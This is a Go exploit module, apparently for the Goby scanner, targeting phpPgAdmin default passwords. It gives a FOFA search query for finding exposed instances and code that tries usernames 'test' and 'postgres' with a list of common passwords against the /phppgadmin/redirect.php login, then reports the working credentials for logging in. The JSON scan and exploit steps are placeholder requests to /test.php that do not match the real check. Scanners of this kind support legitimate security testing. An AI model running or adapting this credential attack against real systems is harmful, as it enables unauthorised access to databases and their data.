package exploits

import (
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "phpPgAdmin /phppgadmin/redirect.php Default Password Vulnerability",
    "Description": "<p>phpPgAdmin is a web-based PostgreSQL database management tool that allows users to access and manage PostgreSQL databases through a browser. The application has a default password, and an attacker can log into the system to obtain sensitive information.</p>",
    "Product": "phpPgAdmin",
    "Homepage": "http://phppgadmin.sourceforge.net/",
    "DisclosureDate": "2024-09-27",
    "Author": "3013320359@qq.com",
    "FofaQuery": "title=\"phppgadmin\" && body=\"phppgadmin\"",
    "GobyQuery": "title=\"phppgadmin\" && body=\"phppgadmin\"",
    "Level": "1",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "phpPgAdmin /phppgadmin/redirect.php 默认口令漏洞",
            "Product": "phpPgAdmin",
            "Description": "<p>phpPgAdmin是一个基于Web的PostgreSQL数据库管理工具，它允许用户通过浏览器访问和管理PostgreSQL数据库。该应用存在默认口令，攻击者可以登录该系统获取敏感信息。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "两高一弱",
                "默认口令"
            ]
        },
        "EN": {
            "Name": "phpPgAdmin /phppgadmin/redirect.php Default Password Vulnerability",
            "Product": "phpPgAdmin",
            "Description": "<p>phpPgAdmin is a web-based PostgreSQL database management tool that allows users to access and manage PostgreSQL databases through a browser. The application has a default password, and an attacker can log into the system to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "2H1W",
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-09-27",
    "Variables": {},
    "PocId": "9957"
}`

	//请求发送
	//注意：本函数传入的参数为hostInfo
	//注意：模板编写后务必全局替换后面随机字符AAAA, POC检测函数也需要同步修改
	sendPayloadixWQKFLeBZ := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/phppgadmin/redirect.php`
		vulInfo := ``
		userInfoList := []string{`test`, `postgres`}
		pwdInfoList := []string{`admin123`, `admin`, `123456`, `12345678`, `666666`, `888888`}

		for _, userInfo := range userInfoList {
			for _, pwdInfo := range pwdInfoList {
				postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
				postRequestConfig.VerifyTls = false
				postRequestConfig.FollowRedirect = false
				postRequestConfig.Header.Store("Accept-Language", "  zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
				postRequestConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0")
				postRequestConfig.Header.Store("Content-Type", " application/x-www-form-urlencoded")
				postRequestConfig.Header.Store("Accept", "  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8")
				postRequestConfig.Header.Store("Accept-Encoding", " gzip, deflate")
				postRequestConfig.Data = fmt.Sprintf("subject=server&server=localhost%%3A5432%%3Aallow&loginServer=localhost%%3A5432%%3Aallow&loginUsername=%s&loginPassword_451ff50a1b7f02422c818da4dd377d27=%s&loginSubmit=%%E7%%99%%BB%%E5%%BD%%95", userInfo, pwdInfo)
				//请求
				response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
				if err != nil {
					return false, vulInfo, vulPath
				}
				if strings.Contains(response.RawBody, "default administrative connection database") {
					vulInfo = userInfo + ":" + pwdInfo
					return true, vulInfo, vulPath
				}
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadixWQKFLeBZ(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadixWQKFLeBZ(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
